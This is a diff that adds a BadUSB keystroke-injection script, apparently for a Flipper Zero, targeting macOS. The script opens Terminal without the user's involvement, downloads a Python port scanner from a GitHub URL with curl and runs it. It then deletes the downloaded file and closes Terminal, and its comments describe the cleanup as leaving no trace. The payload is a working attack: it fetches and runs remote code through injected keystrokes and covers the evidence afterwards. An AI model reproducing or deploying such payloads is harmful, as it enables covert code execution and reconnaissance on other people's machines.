@@ -1,0 +1,40 @@
+REM Scanpy-Local-Common-python3_MacOS
+REM Description: Launch scanpy.py using common ports on local machine
+REM Author: Thomas McNamee
+REM Target: macOS 11+
+
+REM Adjust file accordingly
+
+DELAY 2000
+GUI SPACE
+ENTER
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 1000
+STRING curl https://raw.githubusercontent.com/tcmtech98/FlipperZero/main/scanpy/scanpy.py >> PythonDownload.py
+ENTER
+DELAY 5000
+STRING python3 PythonDownload.py local common
+ENTER
+
+REM Deletes PythonDownload.py from machine, leaving no trace.
+DELAY 1000
+GUI n
+ENTER
+DELAY 500
+STRING rm PythonDownload.py
+ENTER
+DELAY 500
+GUI w
+
+REM Auto shutdown of Terminal, for security and the sake of leaving no trace
+REM You can also terminate on Flipper and Mac
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 180000
+CTRL c
+GUI q
